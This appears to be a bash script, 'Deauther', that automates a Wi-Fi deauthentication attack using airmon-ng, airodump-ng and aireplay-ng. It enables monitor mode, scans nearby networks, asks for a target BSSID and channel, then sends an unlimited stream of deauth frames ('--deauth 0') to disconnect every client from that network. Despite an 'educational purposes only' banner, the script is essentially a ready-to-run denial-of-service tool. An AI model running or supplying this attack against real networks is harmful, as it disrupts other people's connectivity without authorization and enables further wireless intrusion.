#!/bin/bash


#checking root permission

if [ " $EUID" -eq 0  ];then
	echo " you are a superuser"
else 
	echo "please run the sript using sudo"
	exit
fi
clear

#desighn
dinterface=interface2

echo "

 ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
 ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
 ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
 ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
 ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
[ ! ] wifi deauthentication tool  |  use responsibly  |  educational purposes only
────────────────────────────────────────────────────────────
interface    $dinterface
mode         managed
status       running..

"





#listing interfaces and chosing primary inter face

ifconfig | awk '/^[a-zA-Z0-9]/{print ++n ".",$1 }'

read -p "[*]enabling monitor mode chose the name of a interface:" interface 

#putting the slected interface to monitor mode 

sudo airmon-ng start $interface
clear
#checking the interface is successfully turned monitor on and   also taking  monitor mode interface name 
extention="mon"
interface2=$interface$extention

#desighn2


echo "

 ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
 ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
 ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
 ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
 ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
[ ! ] wifi deauthentication tool  |  use responsibly  |  educational purposes only
────────────────────────────────────────────────────────────
interface    $interface2
mode         monitor
status       running..

"





#scanning the  area for available  networks  and  taaking input for bssid and channel

sudo airodump-ng  -i $interface2 

echo "

 ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
 ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
 ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
 ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
 ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
[ ! ] wifi deauthentication tool  |  use responsibly  |  educational purposes only
────────────────────────────────────────────────────────────
interface    $interface2
mode         monitor
status       running..

"
read -p  "[*]enter bssid of the target network:" bssid 
read -p  "[*]enter channel number of the target network:" channel

echo "
	BSSID: $bssid
	CHANNEL: $channel
	INTERFACE: $interface2

"

#taking input for channel specified scan and it's interval time


sudo  airodump-ng --bssid $bssid   -c $channel -i  $interface2

#sending deauth signal using aireplay-ng into the specified bssid and channel

sudo aireplay-ng -a  $bssid  --deauth 0  $interface2

#making the interface into managed mode

sudo airmon-ng stop  $interface2 
